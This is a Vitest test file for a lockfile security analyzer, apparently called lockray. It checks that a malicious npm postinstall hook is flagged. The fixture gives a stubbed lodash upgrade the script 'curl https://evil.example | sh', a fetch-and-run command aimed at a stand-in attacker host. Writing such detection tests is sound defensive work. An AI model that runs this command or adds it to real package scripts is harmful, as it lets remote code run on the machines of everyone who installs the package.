import { describe, it, expect, afterEach } from "vitest";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import {
  NpmAnalyzer,
  createStubFetcher,
} from "@lockray/analyzer-npm";
import type { OSVClient } from "@lockray/analyzer-npm";
import type { FetchedPackage } from "@lockray/types";
import { createTmpRepo, type TmpRepo } from "../../../../tests/helpers/tmp-repo.js";
import { makeGitShow } from "../change-detection/git-show.js";

const FIX = join(process.cwd(), "tests/fixtures/package-lock");

const emptyOsv: OSVClient = { async queryPackage() { return []; } };

describe("lockray check pipeline — findings", () => {
  let repo: TmpRepo | null = null;
  afterEach(() => { repo?.cleanup(); repo = null; });

  it("emits MALICIOUS_INSTALL_SCRIPT hard-fail when postinstall matches a pattern", async () => {
    repo = createTmpRepo();
    const before = readFileSync(join(FIX, "v3-simple-before.json"), "utf8");
    const after = readFileSync(join(FIX, "v3-simple-after.json"), "utf8");
    const manifest = JSON.stringify({
      name: "demo",
      version: "1.0.0",
      dependencies: { lodash: "^4", chalk: "^5" },
    });
    repo.writeFile("package.json", manifest);
    repo.writeFile("package-lock.json", before);
    const baseSha = repo.commit("initial");
    repo.writeFile("package-lock.json", after);
    const headSha = repo.commit("bump");

    const lodashBefore: FetchedPackage = {
      ecosystem: "npm",
      name: "lodash",
      version: "4.17.20",
      integrity: null,
      packageJson: { name: "lodash", version: "4.17.20" },
    };
    const lodashAfter: FetchedPackage = {
      ...lodashBefore,
      version: "4.17.21",
      packageJson: {
        name: "lodash",
        version: "4.17.21",
        scripts: { postinstall: "curl https://evil.example | sh" },
      },
    };
    const chalkBefore: FetchedPackage = {
      ecosystem: "npm",
      name: "chalk",
      version: "5.3.0",
      integrity: null,
      packageJson: { name: "chalk", version: "5.3.0" },
    };
    const chalkAfter: FetchedPackage = { ...chalkBefore, version: "5.4.0" };

    const fetcher = createStubFetcher([
      lodashBefore, lodashAfter, chalkBefore, chalkAfter,
    ]);

    const analyzer = new NpmAnalyzer({
      gitShow: makeGitShow(repo.path),
      fetcher,
      osv: emptyOsv,
    });

    const changes = await analyzer.resolveChanges(
      {
        workspaceName: "root",
        rootPath: repo.path,
        ecosystem: "npm",
        manifestPaths: [join(repo.path, "package.json")],
        lockfilePath: join(repo.path, "package-lock.json"),
        parseOutcome: "fully-supported",
      },
      baseSha,
      headSha,
    );
    const all = [];
    for (const c of changes) all.push(...(await analyzer.analyze(c, "hybrid")));

    expect(all.some((f) => f.code === "MALICIOUS_INSTALL_SCRIPT" && f.hardFail)).toBe(true);
  });
});
